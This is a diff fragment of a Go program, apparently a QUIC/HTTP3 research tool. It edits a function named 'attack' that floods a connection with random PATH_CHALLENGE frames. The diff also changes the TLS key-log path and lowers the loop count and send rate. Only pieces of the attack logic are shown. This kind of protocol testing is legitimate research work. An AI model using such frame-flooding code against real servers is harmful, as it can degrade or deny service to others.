@@ -65,8 +65,8 @@ var keyLog io.Writer
 func main() {
 	//go func() { log.Fatal(echoServer()) }()
 
-	keyLogFile := "C:\\Users\\13298\\Desktop\\key.log"
-	//keyLogFile := "/home/john/Desktop/cjj_related/key.log"
+	//keyLogFile := "C:\\Users\\13298\\Desktop\\key.log"
+	keyLogFile := "/home/john/Desktop/cjj_related/key.log"
 	//keyLogFile := "/mnt/hgfs/work/key.log"
 
 	if len(keyLogFile) > 0 {
@@ -366,7 +366,7 @@ func attack(connectAddr, targetAlpn string, wg *sync.WaitGroup) (response *HTTPM
 	// 	time.Sleep(time.Millisecond * 1)
 	// }
 
-	for i := 0; i < 1000; i++ {
+	for i := 0; i < 10; i++ {
 		rand.Read(randomBytes)
 		var randomBytesArray [8]byte
 		copy(randomBytesArray[:], randomBytes)
@@ -381,10 +381,10 @@ func attack(connectAddr, targetAlpn string, wg *sync.WaitGroup) (response *HTTPM
 			path_challengeFrame,
 		}
 		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
-		time.Sleep(time.Millisecond * 5)
+		time.Sleep(time.Millisecond * 50)
 	}
 
-	time.Sleep(time.Millisecond * 100)
+	time.Sleep(time.Millisecond * 1000)
 	//time.Sleep(time.Second * 1)
 
 	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(fin_frame)
